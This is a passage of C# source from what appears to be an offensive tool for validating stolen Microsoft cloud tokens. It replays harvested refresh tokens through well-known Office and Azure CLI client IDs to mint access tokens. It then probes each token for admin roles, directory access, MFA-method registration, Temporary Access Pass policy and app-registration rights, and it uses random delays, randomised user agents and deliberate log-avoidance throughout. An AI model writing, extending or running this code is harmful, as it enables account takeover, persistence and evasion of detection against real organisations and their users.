            var clientsToTry = new List<(string id, string name)>();
            if (!string.IsNullOrEmpty(token.ClientId) && IsValidGuid(token.ClientId!))
                clientsToTry.Add((token.ClientId!, "original"));
            clientsToTry.Add(("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Office"));
            clientsToTry.Add(("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Azure CLI"));

            // only graph scope first, then management if graph fails
            var scopeList = new[] {
                "https://graph.microsoft.com/.default offline_access",
                "https://management.azure.com/.default offline_access"
            };

            // only try common (universal) - avoids wrong-tenant errors entirely
            var url = string.Format(TokenEndpoint, "common");

            foreach (var (clientId, clientName) in clientsToTry)
            {
                foreach (var scope in scopeList)
                {
                    Thread.Sleep(_rng.Next(30, 100));

                    var content = new FormUrlEncodedContent(new Dictionary<string, string>
                    {
                        ["grant_type"] = "refresh_token",
                        ["client_id"] = clientId,
                        ["refresh_token"] = token.TokenValue,
                        ["scope"] = scope
                    });

                    try
                    {
                        var req = new HttpRequestMessage(HttpMethod.Post, url) { Content = content };
                        var resp = Http.Send(req);
                        var body = ReadBody(resp);

                        if (resp.StatusCode == HttpStatusCode.OK)
                        {
                            var json = JsonSerializer.Deserialize<Dictionary<string, object>>(body);
                            if (json != null && json.TryGetValue("access_token", out var at) && at is JsonElement jat && jat.ValueKind == JsonValueKind.String)
                            {
                                accessToken = jat.GetString();
                                clientUsed = clientName;
                                scopeUsed = scope.Split('/')[2].Split('.')[0];
                                break;
                            }
                        }
                        else
                        {
                            try
                            {
                                var json = JsonSerializer.Deserialize<Dictionary<string, object>>(body);
                                if (json != null && json.TryGetValue("error", out var err) && err is JsonElement je && je.ValueKind == JsonValueKind.String)
                                {
                                    lastError = je.GetString();
                                    // invalid_grant = token dead, no point trying more scopes
                                    if (lastError == "invalid_grant") break;
                                }
                            }
                            catch { }
                        }
                    }
                    catch { }
                }

                if (accessToken != null) break;
                // if invalid_grant on this client, token is dead - skip all remaining clients
                if (lastError == "invalid_grant") break;
            }

            if (accessToken == null)
                return new ValidationResult { Token = token, Valid = false, Error = $"exchange failed: {lastError ?? "no valid exchange"}" };

            // we got an AT, now deep probe
            var result = new ValidationResult { Token = token, Valid = true, StatusCode = 200 };
            result.Capabilities["exchange"] = $"OK via {clientUsed} ({scopeUsed})";

            bool isGraphToken = scopeUsed != "management";

            // get identity from /me (only works with graph scope)
            if (isGraphToken)
            {
                var meResp = GraphGet($"{GraphBase}/me", accessToken);
                if (meResp.status == HttpStatusCode.OK)
                {
                    try
                    {
                        var me = JsonSerializer.Deserialize<Dictionary<string, object>>(meResp.body);
                        if (me != null)
                            result.Capabilities["identity"] = $"{Jstr(me, "displayName")} <{Jstr(me, "mail") ?? Jstr(me, "userPrincipalName")}>";
                    }
                    catch { }
                }

                ProbeCapabilities(accessToken, result);
            }
            else
            {
                // management.azure.com token - check azure subscriptions instead
                result.Capabilities["scope"] = "Azure Management (not Graph)";
                var subResp = GraphGet("https://management.azure.com/subscriptions?api-version=2022-12-01", accessToken);
                if (subResp.status == HttpStatusCode.OK)
                {
                    try
                    {
                        var json = JsonSerializer.Deserialize<Dictionary<string, object>>(subResp.body);
                        if (json != null && json.TryGetValue("value", out var val) && val is JsonElement arr && arr.ValueKind == JsonValueKind.Array)
                        {
                            var subs = new List<string>();
                            foreach (var sub in arr.EnumerateArray())
                            {
                                if (sub.TryGetProperty("displayName", out var dn) && dn.ValueKind == JsonValueKind.String)
                                    subs.Add(dn.GetString()!);
                            }
                            result.Capabilities["subscriptions"] = subs.Count > 0 ? string.Join(", ", subs.Take(5)) : "none";
                        }
                    }
                    catch { }
                }

                // skip graph crossover - would generate extra Azure AD log entries
                // graph probing happens via the RT exchange path instead
            }
            return result;
        }
        catch (Exception ex)
        {
            return new ValidationResult { Token = token, Valid = false, Error = Truncate(ex.Message, 60) };
        }
    }

    // run all capability probes against graph with a valid access token
    private void ProbeCapabilities(string accessToken, ValidationResult result)
    {
        // 1. Directory users (admin check)
        Thread.Sleep(_rng.Next(30, 80));
        var usersResp = GraphGet($"{GraphBase}/users?$top=3&$select=displayName", accessToken);
        result.Capabilities["directory"] = usersResp.status == HttpStatusCode.OK ? "readable (User.Read.All)" : $"no ({(int)usersResp.status})";

        // 2. check own roles (admin?)
        Thread.Sleep(_rng.Next(50, 150));
        var rolesResp = GraphGet($"{GraphBase}/me/memberOf?$select=displayName", accessToken);
        if (rolesResp.status == HttpStatusCode.OK)
        {
            try
            {
                var json = JsonSerializer.Deserialize<Dictionary<string, object>>(rolesResp.body);
                if (json != null && json.TryGetValue("value", out var val) && val is JsonElement arr && arr.ValueKind == JsonValueKind.Array)
                {
                    var roles = new List<string>();
                    foreach (var item in arr.EnumerateArray())
                    {
                        if (item.TryGetProperty("displayName", out var dn) && dn.ValueKind == JsonValueKind.String)
                        {
                            var name = dn.GetString()!;
                            if (name.Contains("Admin", StringComparison.OrdinalIgnoreCase) ||
                                name.Contains("Global", StringComparison.OrdinalIgnoreCase))
                                roles.Add(name);
                        }
                    }
                    result.Capabilities["admin_roles"] = roles.Count > 0 ? string.Join(", ", roles) : "none";
                }
            }
            catch { result.Capabilities["admin_roles"] = "parse error"; }
        }

        // 6. MFA: can we list auth methods? (totp registration check)
        Thread.Sleep(_rng.Next(50, 150));
        var mfaResp = GraphGet($"{GraphBase}/me/authentication/methods", accessToken);
        result.Capabilities["mfa_methods"] = mfaResp.status == HttpStatusCode.OK ? "readable (totp reg possible)" : $"no ({(int)mfaResp.status})";

        // 7. TAP policy check
        Thread.Sleep(_rng.Next(50, 150));
        var tapResp = GraphGet($"{GraphBeta}/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/TemporaryAccessPass", accessToken);
        if (tapResp.status == HttpStatusCode.OK)
        {
            bool enabled = tapResp.body.Contains("\"enabled\"", StringComparison.OrdinalIgnoreCase);
            result.Capabilities["tap_policy"] = enabled ? "enabled" : "disabled";
        }
        else
            result.Capabilities["tap_policy"] = $"no ({(int)tapResp.status})";

        // 8. app registration rights
        Thread.Sleep(_rng.Next(50, 150));
        var policyResp = GraphGet($"{GraphBase}/policies/authorizationPolicy", accessToken);
        if (policyResp.status == HttpStatusCode.OK)
        {
            bool canRegister = policyResp.body.Contains("\"allowedToCreateApps\":true", StringComparison.OrdinalIgnoreCase)
                            || policyResp.body.Contains("\"allowedToCreateApps\": true", StringComparison.OrdinalIgnoreCase);
            result.Capabilities["app_registration"] = canRegister ? "allowed" : "blocked by policy";
        }
        else
            result.Capabilities["app_registration"] = $"no ({(int)policyResp.status})";
    }

    // helper: GET request to any api
    private (HttpStatusCode status, string body) GraphGet(string url, string accessToken)
    {
        try
        {
            var req = new HttpRequestMessage(HttpMethod.Get, url);
            req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", accessToken);
            req.Headers.Add("User-Agent", RandomUA());

            var resp = Http.Send(req);
            return (resp.StatusCode, ReadBody(resp));
        }
        catch
        {
            return (HttpStatusCode.ServiceUnavailable, "");
        }
    }

    private static string ReadBody(HttpResponseMessage resp)
    {
        using var reader = new StreamReader(resp.Content.ReadAsStream());
        return reader.ReadToEnd();
    }

    private static string? Jstr(Dictionary<string, object> dict, string key)
    {
        if (dict.TryGetValue(key, out var val) && val is JsonElement je && je.ValueKind == JsonValueKind.String)
            return je.GetString();
        return null;
    }

    private static string Truncate(string s, int max) => s.Length > max ? s[..max] : s;

    // validate tenant_id: must be a valid GUID or known alias
    private static bool IsValidTenantId(string tenant)
    {
        if (Guid.TryParse(tenant, out _)) return true;
        // known aliases
        return tenant is "common" or "organizations" or "consumers";
    }

    // validate GUID format (for client_id etc)
    private static bool IsValidGuid(string value) => Guid.TryParse(value, out _);

    // detect WAM-sourced tokens (BrokerPlugin .pwd files = PRT-bound, can't be replayed)
    private static bool IsWamSourced(Token token)
    {
        if (string.IsNullOrEmpty(token.SourceFile)) return false;
        var src = token.SourceFile.ToLowerInvariant();
        // WAM files: a_*.pwd, p_*.pwd, *.def (from BrokerPlugin LocalState)
        return src.EndsWith(".pwd") || src.EndsWith(".def") || src.Contains("brokerplugin");
    }
}

public class ValidationResult
{
    public Token Token { get; set; } = null!;
    public bool Valid { get; set; }
    public int? StatusCode { get; set; }
    public string? Error { get; set; }
    public Dictionary<string, string> Capabilities { get; set; } = new();
}
